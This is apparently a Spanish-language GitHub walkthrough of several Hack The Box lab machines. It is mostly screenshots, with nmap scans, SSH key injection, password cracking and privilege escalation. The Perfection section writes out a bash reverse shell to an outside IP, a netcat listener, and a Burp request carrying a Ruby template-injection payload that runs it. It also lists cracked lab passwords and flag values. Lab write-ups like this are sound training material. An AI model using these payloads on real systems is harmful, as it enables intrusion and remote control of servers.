# EAM-HACK-THE-BOX

Guía de conexión a Hack the box!

Abrimos la web e iniciamos sesión con nustra cuenta

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/9fbe9d26-02bc-49bc-ad0f-0b3ab4e5a96f)

Luego nos vamos al apartado en la esquina superior derecha donde dice CONNECT TO HTB

Seleccionamos el de nuestro interés, startingpoint o machines

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/cfae33bb-3dc2-453c-b882-5ee3f7c9a3e9)

Y descargamos el archivo para conectarnos por medio de openvpn

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/3720b8f7-6806-4f39-aae6-442d8c5ea077)

Ejecutamos el comando de openvpn en la terminal

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/3a048aea-c539-43b1-b303-5b9b60978249)

e iniciamos el escaneo de la primera maquina con NMAP

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/fa2ea01e-3285-4a3f-8348-855d796cd1f8)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/f7f3c73f-737e-452d-ac92-9967c803bdcc)

identificamos sus puertos abiertos, en este caso es el 23/TCP telnet En el cual está corriendo un sistema Linux… Intentamos entrar con la contraseña más común “root”

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/2b169ce0-b5e3-43ab-ace9-3e47c1a720db)

y obtenemos la bandera

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/2ee8e2a9-aa66-40ef-b951-da00e8a4e46c)

MÁQUINA 2

Escaneamos la IP

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/2145fb89-1470-475e-85db-84f9ed459872)

Puertos abiertos: 21/tcp open, realizamos una conexión ftp hacia la máquina virtual y obtenemos la bandera

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/fe21d9af-eb83-4b44-8c25-98f54ebc1ccd)

-------------------------------------------------------------------------
MACHINES - VPN LAB (NO STARTING POINT)

Nos conectamos a la VPN

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/463e9c38-79ed-4296-a418-f287835f159a)

______________________________________________________________________________________________________________
                                        
                                                 -- CODIFY MACHINE --

______________________________________________________________________________________________________________

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/4322b090-acf4-4bd2-aed4-fdba2b751252)

Hacemos un nmap a la IP

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/cf79a7f2-aae8-4178-9060-fad23345f608)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/21b061e9-1851-485b-b8f2-9b50725bc235)

Como Podemos presenciar, tiene los puertos 22, 80 y 3000 abiertos

El acceso remoto a través del puerto 22 estaba habilitado mediante OpenSSH 8.9p1, una versión bastante reciente que sugiere una menor probabilidad de vulnerabilidades. Además, el puerto 80 estaba abierto con un servidor web Apache 2.4.52 que admite métodos comunes como GET, HEAD y POST, indicando la posibilidad de explorar más a fondo una aplicación web.

El puerto 3000/tcp se encuentra activo y aloja una aplicación que utiliza el framework Node.js Express. Este hallazgo señala la presencia de un servidor web o una aplicación específica desarrollada con Node.js Express. La apertura de este puerto implica la accesibilidad de la aplicación a través de la red, indicando la utilización de Node.js como plataforma de desarrollo en el contexto de la seguridad de la información.

Añadimos la máquina a nuestro archivo de hosts

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/38c70d81-9dd7-4f56-a86c-32be2047617f)

Ingresamos a la web codify.htb

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/e6ecf9ed-6ce7-4fb8-a529-456228d12df1)

Nos creamos una llave ssh para intentar inyectar código por medio del campo de texto
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqaNdrDldr4xtmJAhhS23bKk00xUniBNfjfnuMlYtjdTdclWHmA612HsqcQUtu998dEmSKOprfWIyJqFhuRhtVSHnuYZSLg+cFkoTPMbaZoChbZH1hTyhx8S9KP8a+FyDyhpLwWtBzIh4QeOLrruA7r/YCeyDnX/eWA7+5S8AxaA6xgPhbhtLjoUVhzk88HKYGpykJBZFL+…..

Inyectamos nuestra ssh a la máquina

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/67a3b637-908d-4330-b14c-0a3712cf5447)

Ahora procedemos a conectarnos por medio de ssh

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/8b2e72cc-784c-403c-a93b-7cc7456fd123)

Empezamos a navegar por los directorios y encontramos un Usuario Joshua

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/f7c43ee8-28a7-4dbf-ac49-901b10e66663)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/7f2760f2-50c1-4a5e-a656-b4bc5833f33a)

Inyectamos John e iniciamos sesión con el usuario Joshua (pass = Spongebob1)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/b17af1a0-7ae2-4d4a-972e-468273c86bcf)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/ce66e2b0-2fcc-4b8e-b999-8b728ef31961)

Y obtenemos la primera flag 3c717fed1bc3e958ea89ce0d43fae965

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/b0f8f81b-4019-49e2-832a-e11fecccc278)

MOMENTO DE ESCALAR PRIVILEGIOS desde el usuario Joshua

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/323f45f1-a49a-4cab-8e31-be01c925bbd3)

Nos creamos un script y lo ejecutamos para obtener la contraseña root

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/51520f00-ec39-48d6-a293-31bb4cf9a9c8)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/3c4f22b4-8d22-41fa-991c-e8bf900e78ae)

Finalmente la encontramos e iniciamos sesión como root

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/e18d5455-59dd-4299-bb9e-56a1ae34e71a)

 Y obtenemos la Segunda bandera 8558ae9d77f91a58878bb2472703142e

 Y obtenemos la Segunda bandera 
8558ae9d77f91a58878bb2472703142e

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c3e2ad27-0d79-4e74-8256-42f5d53d683b)

------------------ VAMOS MEJOR CON OTRA MÁQUINA ---------------------
BIZNESS

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/e71c2d31-8ec0-4919-a314-6082c9ffc21d)

Realizamos su respectivo nmap para obtener los puertos abiertos:

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c0daa85b-5888-431e-876a-5468fe6f4f21)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/04753640-278a-4a3d-8458-19dc93825dac)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/f7ea7366-2feb-4a7d-b560-562fde72dcb8)

Y vemos que tiene abiertos los puertos 34719/TCP , 443/tcp, 80/tcp  y 22/tcp

Ahora le hacemos un escaneo a los puertos

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/388d9a92-6442-47f7-87bb-2fbae5dbb6f6)

añadimos la ip a nuestro archivo de hosts

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/b4f4542b-1cc6-4461-8ade-7fea8947d9d3)

Y entramos a la página

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/abee99d6-cbd8-4d78-b318-d3d9507e4729)

Le hacemos un FUF para enumerar directorios

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/e7649b65-3bd1-45fe-bd12-10744794e561)

Descubrimos una ruta

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/6756869c-3899-44f8-a652-dc39071e2fc7)

Intentamos con las credenciales básicas (admin, admin), (12345, 12345), (admin, 12345), (,) ,(password, password) y ninguna nos funciona :( ... mejor le tiramos un payload

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/157342a9-5f38-4a12-a073-135004adde34)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c58924fb-3698-4bd0-b84c-43053995ea97)

Buscamos la vulnerabilidad 

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/4aa4cabb-d55f-4cba-9409-9dccfc58022e)

Clonamos el repo y ejecutamos el payload

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/029ba984-10ea-4909-bca5-df9bca75e894)

SUCCESSFULLYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY, pero ya no sé que hacer aquí jajaja. (F)


__________________________________________________________________________________________________________________________________

                                              Vamos a intentar la máquina Perfection

___________________________________________________________________________________________________________________________________

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/6dc2ac63-2ff3-4fb4-b0a6-cfe3ce2a2d0a)

Realizamos un escaneo
sudo nmap -sC -sV 10.10.11.253

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/f0373507-482a-4169-a416-b83e7219b7f3)

Descubrimos que están abiertos los puertos 80 y 22 con tcp

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 16:22 -05
Nmap scan report for 10.10.11.253
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/55cef463-5a03-497e-a20a-0e64dbadde9b)

Deducimos que por el puerto 80 se posee un servicio web e intentamos entrar por medio de un navegador

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/98919eb9-15b4-443c-8796-9f1d36b395ec)

Ahora procedemos a realizarle un escaneo a la página web

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/5cae7dd4-8b5a-4041-8779-9fd5b2152211)

Básicamente nos dice que es un servidor nginx con tecnología de WEBrick/1.7.0 y está programado en el lenguaje de Ruby 3.0.2 ... Con esta información, buscamos un exploit o vulnerabilidad

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/584c3db9-519b-442e-b1c6-b3cdc139f30e)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/38cb7928-8ff2-4515-b8e5-6d3bc1e5be8c)

Según esta parte de la documentación, podemos intentar algo en la ruta de la página

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/1385e191-dd4c-4eb8-afe8-c8ec77c29096)

Lo intentamos

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/efc2717b-f8f3-456c-8144-29bbddac466a)

y obtenemos lo siguiente:

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/37f7d5ff-fdb9-4144-a251-2a9ad1e6ea32)

No encontramos nada, pero ya sabemos que el lenguaje es Ruby y está con algo de “Sinatra” ... Miramos como se comporta la página

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/b5793e42-f15f-4556-b90c-c2363d3917e4)

SI intentamos meter código en los inputs nos tira un aviso de malicious input blocked

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/f2597886-dcdc-4fa9-ad21-353d08300cb3)

Según foros, podemos usar inyección de código mediante la web y hablan sobre 

ssti payload hacktricks… buscaré

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/384991a1-a5b0-4a63-a1ce-37783033add1)

Generamos una hURL

hURL -B "bash -i >& /dev/tcp/10.10.14.132/7373 0>&1"

Y lo url encodeamos
hURL -U "Aqui va el texto de base64 ENcoded"

Nota: la IP es la de la conexión a HTB

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/48a81e21-67f6-4b05-8958-07d35463809b)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/81414b71-1d5c-4d79-9a0b-bff4fb6538ff)

Ponemos a escuchar en el puerto 7373

nc -lvnp 7373

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/e380c2ab-0a9d-49a2-9f6a-7f5a1537cfcc)

Abrimos Burp Suite, configuramos el navegador de firefox en proxys para que haya una conexión hacia la configuración de Burp suite en la ip 127.0.0.1 con el puerto 8080

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/553cf1a1-e8f4-4941-be2d-eb5b7c4426f4)

Vamos a Burp suite, en el apartado de proxy y damos click en intercept is off

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/6bcab612-6720-4436-89a8-1113568b7667)

En este momento se activa y lo que haremos será llenar el formulario y dar click en enviar

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/a9ae7b48-d2f8-4124-82a2-0a0a7a57f5a9)

 En el Burp Suite nos saldrá lo siguiente:

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/978515bd-816c-412b-a171-0af4e1e27ad1)

Oprimimos ctrl + R y esto pintara de color el menú Repeater que se encuentra en la parte superior
Damos click y desde allí podremos hacer peticiones hacia la web

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/6cce7a32-2fef-4a80-85d5-a898b59f917d)

Ahora bien, teniendo en cuenta el hURL que generamos antes, procederemos a injectar código con Burp Suite a la página

POST /weighted-grade-calc HTTP/1.1

Host: 10.10.11.253

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 164

Origin: http://10.10.11.253

Connection: close

Referer: http://10.10.11.253/weighted-grade

Upgrade-Insecure-Requests: 1



grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvNzM3MyAwPiYx|+base64+-d+|+bash");%25>1

NOtA: El ENcoded lo ponemos en alguno de los campos, en este caso está dentro de category1

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/6f215f81-4dbe-4de8-ba33-4978d21e274b)

Recuerdan el puerto que dejamos escuchando en el 7373? pues...

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/642f568a-1673-4da7-a030-6ceebf2025c1)

hemos entrado!!

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/1cdbaa1c-0a79-4f66-8f69-4c623beb33cf)
Y ahí tenemos la primera flag
![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/57fe0c58-f0fa-49fe-bdb4-7a61b6f42f01)

Si seguimos navegando, encontramos unos HASH
![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/7a1fedd8-1a52-4a6a-abe7-48d7b7589dc0)

Copiamos el hash de Susan y lo guardamos en un archivo en nuestro kali linux

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/5d2a1a23-29a9-46f4-bd9f-714b5d10c6d4)

Procedemos a tratar de descubrir el hash con el comando: hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c09fe4ea-27a2-477b-a0be-41cf8fa2f08a)

Y nos botó lo siguiente:

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/9fce250a-27de-4917-a7a3-caae9c0fb4c3)

Teniendo en cuenta que tenemos el 72% de resultado de la contraseña, intentamos conectarnos a susan

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/1a05aec7-b695-4538-8542-03664bd50b0d)

No, ni idea de la contraseña, esperemos que termine el proceso mejor :)

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c98e3d6f-99af-47b5-91ca-f461626bcd29)

Una vez terminado, intenemos ingresar

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/149c0b32-d491-424d-bfae-95cb66955166)

Iniciamos como superusuario y leemos el archivo root.txt


![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/c96b8f78-b428-422a-99fc-1d3fbdeaaad4)


Y MEEEEEEEEEEELO CARAMELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO

![image](https://github.com/Z4ND3RX/EAM-HACK-THE-BOX/assets/106892676/7fb46752-22d3-4a4f-a290-89d4973ef8ae)

